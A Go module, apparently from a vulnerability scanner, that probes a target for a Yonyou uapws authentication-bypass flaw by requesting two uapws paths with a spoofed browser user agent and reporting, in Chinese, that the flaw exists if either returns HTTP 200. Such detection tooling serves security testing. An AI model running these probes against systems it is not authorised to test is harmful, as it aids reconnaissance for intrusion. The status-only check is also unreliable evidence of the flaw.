package uapws_acessBypass

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url1 := url + "/uapws/index.jsp"
	resp, err := client.R().SetHeaders(map[string]string{ // Set multiple headers at once
		"User-Agent": UA,
	}).Get(url1)
	if err != nil {
		color.Red.Println("[-] 用友 uapws 认证绕过漏洞不存在")
		return
	}
	if resp.Status == "200 OK" {
		color.Green.Println("[+] 用友 uapws 认证绕过漏洞存在 -> " + url1)
	}
	url2 := url + "/uapws/login.ajax"
	resp1, err1 := client.R().SetHeaders(map[string]string{ // Set multiple headers at once
		"User-Agent": UA,
	}).Get(url2)
	if err1 != nil {
		color.Red.Println("[-] 用友 uapws 认证绕过漏洞不存在")
		return
	}
	if resp1.Status == "200 OK" {
		color.Green.Println("[+] 用友 uapws 认证绕过漏洞存在 -> " + url2)
		return
	}
	color.Red.Println("[-] 用友 uapws 认证绕过漏洞不存在")
}
